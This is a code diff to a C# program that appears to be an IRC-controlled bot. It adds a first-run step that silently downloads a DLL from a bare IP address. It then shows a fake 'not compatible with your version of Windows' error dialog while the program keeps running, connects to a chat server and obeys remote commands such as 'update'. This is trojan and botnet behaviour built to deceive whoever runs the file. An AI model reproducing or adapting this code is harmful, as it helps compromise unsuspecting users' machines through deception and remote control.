@@ -7,6 +7,7 @@ using System.Threading;
 using ChatSharp;
 using System.Net;
 using System.Windows.Forms;
+using System.IO;
 
 namespace tom
 {
@@ -28,8 +29,20 @@ namespace tom
             Random r = new Random();            
             name = "tom_"+VERSION+"_" + r.Next(10000);
 
-            WebClient Client = new WebClient();
-            Client.DownloadFile("http://jaredeverett.ca/bots/ChatSharp.dll", @System.IO.Path.GetDirectoryName(Application.ExecutablePath)+"\\ChatSharp.dll");
+            string curFile = @System.IO.Path.GetDirectoryName(Application.ExecutablePath) + "\\ChatSharp.dll";
+            if (!File.Exists(curFile))
+            {
+                // get DLL
+                WebClient Client = new WebClient();
+                Client.DownloadFile("http://198.211.100.72/bots/ChatSharp.dll", @System.IO.Path.GetDirectoryName(Application.ExecutablePath) + "\\ChatSharp.dll");
+
+                // first time opening - error message
+                const string caption = "Error";
+                var result = MessageBox.Show("Error. \nThis program is not compatible with your version of Windows.", caption,
+                                             MessageBoxButtons.AbortRetryIgnore,
+                                             MessageBoxIcon.Error);
+            }
+            
 
             Connect(name);
         }
@@ -73,7 +86,7 @@ namespace tom
                     SendMessage("hello");
                     break;
                 case "update":
-                    SendMessage(actions.Update());
+                    actions.Update();
                     break;
                 case "help":
                     actions.HelpMenu();
